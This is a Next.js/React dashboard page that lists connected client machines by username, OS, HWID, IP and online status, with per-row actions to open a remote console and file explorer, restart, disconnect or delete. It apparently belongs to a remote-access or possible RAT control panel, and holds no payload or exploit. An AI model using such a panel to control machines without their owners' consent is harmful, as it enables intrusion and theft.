/* eslint-disable react-hooks/exhaustive-deps */
"use client";

import {
  Table,
  TableHeader,
  TableColumn,
  TableBody,
  TableRow,
  TableCell,
  Input,
  Button,
  DropdownTrigger,
  Dropdown,
  DropdownMenu,
  DropdownItem,
  Chip,
  Pagination,
  Selection,
  ChipProps,
  SortDescriptor,
  Avatar,
  Spinner,
} from "@heroui/react";
import React, { useCallback, useEffect, useMemo, useState } from "react";
import { Icon } from "@iconify/react";
import ApiClient from "@/api";
import { Clients, Client } from "@/types/clients";
import { format } from "date-fns";
import { toast } from "sonner";
import { useRouter } from "next/navigation";

const columns = [
  { name: "USERNAME", uid: "username", sortable: true },
  { name: "OS", uid: "os", sortable: true },
  { name: "HWID", uid: "hwid", sortable: true },
  { name: "IP", uid: "ip", sortable: true },
  { name: "STATUS", uid: "status", sortable: true },
  { name: "CREATED AT", uid: "createdAt", sortable: true },
  { name: "ACTIONS", uid: "actions" },
];

const statusOptions = [
  { name: "Online", uid: "online" },
  { name: "Offline", uid: "offline" },
];

const statusColorMap: Record<string, ChipProps["color"]> = {
  online: "success",
  offline: "danger",
};

const INITIAL_VISIBLE_COLUMNS = ["username", "hwid", "ip", "status", "actions"];
const STORAGE_KEY = "visibleColumns";
const apiClient = new ApiClient();

const ClientsPage = () => {
  const [clients, setClients] = useState<Clients[]>([]);
  const [filterValue, setFilterValue] = useState("");
  const [selectedKeys, setSelectedKeys] = useState<Selection>(new Set([]));
  const [page, setPage] = useState(-1);
  const [statusFilter, setStatusFilter] = useState<Selection>("all");
  const [rowsPerPage, setRowsPerPage] = useState(8);
  const [isLoading, setIsLoading] = useState(true);
  const [sortDescriptor, setSortDescriptor] = useState<SortDescriptor>({
    column: "status",
    direction: "ascending",
  });
  const router = useRouter();

  const getStoredColumns = (): Set<string> => {
    const stored = localStorage.getItem(STORAGE_KEY);
    return stored
      ? new Set(JSON.parse(stored))
      : new Set(INITIAL_VISIBLE_COLUMNS);
  };
  const [visibleColumns, setVisibleColumns] = useState<Selection>(
    new Set(getStoredColumns())
  );

  const actionList = [
    {
      name: "Open Console",
      key: "console",
      icon: "teenyicons:terminal-outline",
      color: "primary" as const,
      onClick: async (client: Client) => {
        if (client.username && client.hwid) {
          const result = await apiClient.clients.console.createConsole(
            client.hwid
          );
          if (result.status) {
            toast.success("Console opened successfully");
            router.push(`/dashboard/console`);
          } else {
            toast.error("Failed to open console");
          }
        }
      },
    },
    {
      name: "Open File Explorer",
      key: "fileExplorer",
      icon: "solar:folder-outline",
      color: "primary" as const,
      onClick: async (client: Client) => {
        if (client.username && client.hwid) {
          const result =
            await apiClient.clients.fileExplorer.createFileExplorer(
              client.hwid
            );
          if (result.status) {
            toast.success("File explorer opened successfully");
            router.push(`/dashboard/file-explorer`);
          } else {
            toast.error("Failed to open file explorer");
          }
        }
      },
    },
    {
      name: "Disconnect",
      key: "disconnect",
      icon: "solar:power-bold",
      color: "warning" as const,
      onClick: async (client: Client) => {
        if (client.hwid) {
          apiClient.clients.helper
            .killConnection(client.hwid)
            .then((response) => {
              if (response.status) {
                toast.success("Client disconnected successfully");
              } else {
                toast.error("Failed to disconnect client");
              }
            });
        }
      },
    },
    {
      name: "Restart",
      key: "restart",
      icon: "solar:restart-bold",
      color: "secondary" as const,
      onClick: async (client: Client) => {
        if (client.hwid) {
          apiClient.clients.helper
            .restartClient(client.hwid)
            .then((response) => {
              if (response.status) {
                toast.success("Client restarted successfully");
              } else {
                toast.error("Failed to restart client");
              }
            });
        }
      },
    },
    {
      name: "Delete",
      key: "delete",
      icon: "solar:trash-bin-trash-outline",
      color: "danger" as const,
      onClick: async (client: Client) => {
        if (client.hwid) {
          const result = await apiClient.clients.helper.deleteClient(
            client.hwid
          );
          if (result.status) {
            toast.success("Client deleted successfully");
            // Remove client from the list
            setClients((prevClients) =>
              prevClients.filter((c) => c.hwid !== client.hwid)
            );
          } else {
            toast.error("Failed to delete client");
          }
        } else {
          toast.error("Client HWID is undefined");
        }
      },
    },
  ];

  useEffect(() => {
    console.log(selectedKeys);
  }, [selectedKeys]);

  useEffect(() => {
    apiClient.clients.helper
      .getAllClients()
      .then((response) => {
        if (response.status) {
          setClients(response.data.sort((a: Client) => (a.online ? -1 : 1)));
        }
      })
      .finally(() => {
        setIsLoading(false);
      });
  }, []);

  useEffect(() => {
    if (clients.length > 0) {
      setPage(1);
    }
  }, [clients]);

  useEffect(() => {
    localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify(Array.from(visibleColumns))
    );
  }, [visibleColumns]);

  useEffect(() => {
    const updateClientStatus = (data: { hwid: string; online: boolean }) => {
      setClients((prevClients) =>
        prevClients.map((client) =>
          client.hwid === data.hwid
            ? { ...client, online: data.online }
            : client
        )
      );
    };

    apiClient.clients.helper.initSocket(updateClientStatus);

    return () => {
      apiClient.clients.helper.disconnectSocket();
    };
  }, []);

  const hasSearchFilter = Boolean(filterValue);

  const headerColumns = useMemo(() => {
    if (visibleColumns === "all") return columns;

    return columns.filter((column) =>
      Array.from(visibleColumns).includes(column.uid)
    );
  }, [visibleColumns]);

  const filteredItems = useMemo(() => {
    let filteredClients = [...clients];

    if (hasSearchFilter) {
      filteredClients = filteredClients.filter((client) =>
        (client.username ?? "")
          .toLowerCase()
          .includes(filterValue.toLowerCase())
      );
    }
    if (
      statusFilter !== "all" &&
      Array.from(statusFilter).length !== statusOptions.length
    ) {
      filteredClients = filteredClients.filter((client) =>
        Array.from(statusFilter).includes(client.online ? "online" : "offline")
      );
    }

    return filteredClients;
  }, [clients, filterValue, statusFilter]);

  const pages = Math.ceil(filteredItems.length / rowsPerPage);

  const items = useMemo(() => {
    const start = (page - 1) * rowsPerPage;
    const end = start + rowsPerPage;

    return filteredItems.slice(start, end);
  }, [page, filteredItems, rowsPerPage]);

  const sortedItems = useMemo(() => {
    return [...items].sort((a: Client, b: Client) => {
      let first = a[sortDescriptor.column as keyof Client] as number;
      let second = b[sortDescriptor.column as keyof Client] as number;

      if (sortDescriptor.column === "status") {
        first = a.online ? 0 : 1;
        second = b.online ? 0 : 1;
      }

      const cmp = first < second ? -1 : first > second ? 1 : 0;
      return sortDescriptor.direction === "descending" ? -cmp : cmp;
    });
  }, [sortDescriptor, items]);

  const onRowsPerPageChange = useCallback(
    (e: React.ChangeEvent<HTMLSelectElement>) => {
      setRowsPerPage(Number(e.target.value));
      setPage(1);
    },
    []
  );

  const onSearchChange = useCallback((value?: string) => {
    if (value) {
      setFilterValue(value);
      setPage(1);
    } else {
      setFilterValue("");
    }
  }, []);

  const onClear = useCallback(() => {
    setFilterValue("");
    setPage(1);
  }, []);

  const renderCell = useCallback((client: Client, columnKey: React.Key) => {
    switch (columnKey) {
      case "id":
        return <p className="text-bold text-small">{client.id}</p>;

      case "username":
        return (
          <div className="flex items-center gap-2">
            <Avatar
              classNames={{
                base: "bg-gradient-to-br from-[#006bff] to-[#00aaff]",
                icon: "text-black/80",
              }}
              icon={
                <Icon icon="mdi:account" className="text-black" fontSize={25} />
              }
            />
            <p className="text-bold text-small capitalize">{client.username}</p>
          </div>
        );

      case "os":
        if (typeof client.os === "string") {
          return (
            <div className="flex flex-col">
              <p className="text-bold text-small capitalize">{client.os}</p>
              <p className="text-bold text-tiny capitalize text-default-400">
                {client.hostname}
              </p>
            </div>
          );
        }

      case "hwid":
        return <p className="text-bold text-small">{client.hwid}</p>;

      case "ip":
        return <p className="text-bold text-small">{client.ip}</p>;

      case "status":
        const statusText =
          client.online !== undefined
            ? client.online
              ? "Online"
              : "Offline"
            : "N/A";

        return (
          <Chip
            className="capitalize"
            color={statusColorMap[client.online ? "online" : "offline"]}
            size="sm"
            variant="flat"
          >
            {statusText}
          </Chip>
        );

      case "createdAt":
        if (typeof client.createdAt === "string") {
          const date = new Date(client.createdAt);
          return format(date, "dd MMM yyyy, HH:mm");
        }

      case "actions":
        return (
          <div className="relative flex justify-end items-center gap-2">
            <Dropdown>
              <DropdownTrigger>
                <Button isIconOnly size="sm" variant="light">
                  <Icon icon="mdi:dots-vertical" className="text-black" />
                </Button>
              </DropdownTrigger>
              <DropdownMenu>
                {actionList.map((action) => (
                  <DropdownItem
                    key={action.key}
                    startContent={<Icon icon={action.icon} />}
                    color={action.color}
                    onPress={() => {
                      action.onClick(client);
                    }}
                  >
                    {action.name}
                  </DropdownItem>
                ))}
              </DropdownMenu>
            </Dropdown>
          </div>
        );
    }
  }, []);

  const topContent = useMemo(() => {
    return (
      <div className="flex flex-col gap-4">
        <div className="flex justify-between gap-3 items-end">
          <Input
            isClearable
            className="w-full sm:max-w-[44%]"
            placeholder="Search by name..."
            startContent={<Icon icon="mdi:magnify" />}
            value={filterValue}
            onClear={() => onClear()}
            onValueChange={onSearchChange}
          />
          <div className="flex gap-3">
            <Dropdown>
              <DropdownTrigger className="hidden sm:flex">
                <Button
                  endContent={
                    <Icon icon="mdi:chevron-down" className="text-small" />
                  }
                  variant="flat"
                >
                  Status
                </Button>
              </DropdownTrigger>
              <DropdownMenu
                disallowEmptySelection
                aria-label="Table Columns"
                closeOnSelect={false}
                selectedKeys={statusFilter}
                selectionMode="multiple"
                onSelectionChange={setStatusFilter}
              >
                {statusOptions.map((status) => (
                  <DropdownItem key={status.uid} className="capitalize">
                    {status.name}
                  </DropdownItem>
                ))}
              </DropdownMenu>
            </Dropdown>
            <Dropdown>
              <DropdownTrigger className="hidden sm:flex">
                <Button
                  endContent={
                    <Icon icon="mdi:chevron-down" className="text-small" />
                  }
                  variant="flat"
                >
                  Columns
                </Button>
              </DropdownTrigger>
              <DropdownMenu
                disallowEmptySelection
                aria-label="Table Columns"
                closeOnSelect={false}
                selectedKeys={visibleColumns}
                selectionMode="multiple"
                onSelectionChange={setVisibleColumns}
              >
                {columns
                  .filter((column) => column.uid !== "actions")
                  .map((column) => (
                    <DropdownItem key={column.uid} className="capitalize">
                      {column.name}
                    </DropdownItem>
                  ))}
              </DropdownMenu>
            </Dropdown>
          </div>
        </div>
        <span className="text-default-400 text-small">
          Total {clients.length} clients
        </span>
      </div>
    );
  }, [
    filterValue,
    statusFilter,
    visibleColumns,
    onSearchChange,
    onRowsPerPageChange,
    clients.length,
    hasSearchFilter,
  ]);

  const bottomContent = useMemo(() => {
    return (
      <div className="py-2 px-2 flex justify-center items-center">
        <Pagination
          isCompact
          showControls
          showShadow
          color="primary"
          page={page}
          total={pages}
          onChange={setPage}
        />
      </div>
    );
  }, [selectedKeys, items.length, page, pages, hasSearchFilter]);

  return (
    <Table
      isHeaderSticky
      bottomContent={bottomContent}
      bottomContentPlacement="outside"
      classNames={{
        wrapper: "max-h-[565px]",
      }}
      selectedKeys={selectedKeys}
      selectionMode="multiple"
      sortDescriptor={sortDescriptor}
      topContent={topContent}
      topContentPlacement="outside"
      onSelectionChange={setSelectedKeys}
      onSortChange={setSortDescriptor}
      aria-label="Client Table"
    >
      <TableHeader columns={headerColumns}>
        {(column) => (
          <TableColumn
            key={column.uid}
            align={column.uid === "actions" ? "center" : "start"}
            allowsSorting={column.sortable}
          >
            {column.name}
          </TableColumn>
        )}
      </TableHeader>
      <TableBody
        emptyContent={"No clients found"}
        items={sortedItems}
        isLoading={isLoading}
        loadingContent={<Spinner label="Loading..." />}
      >
        {(item) => (
          <TableRow key={item.hwid}>
            {(columnKey) => (
              <TableCell>{renderCell(item, columnKey)}</TableCell>
            )}
          </TableRow>
        )}
      </TableBody>
    </Table>
  );
};

export default ClientsPage;
